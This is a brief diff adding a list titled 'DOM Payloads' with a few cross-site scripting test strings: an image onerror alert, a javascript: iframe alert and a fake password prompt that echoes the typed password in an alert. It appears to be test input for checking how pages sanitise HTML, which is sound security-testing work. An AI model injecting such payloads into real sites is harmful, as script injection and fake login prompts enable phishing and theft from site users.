@@ -1,0 +1,6 @@
+DOM Payloads
+  <img src="http://images.img">
+  <img src=x onerror=;;alert('XXS')>
+  <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+  Please enter your password:<BR><input type = "password" name="pass"/><button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>
+  
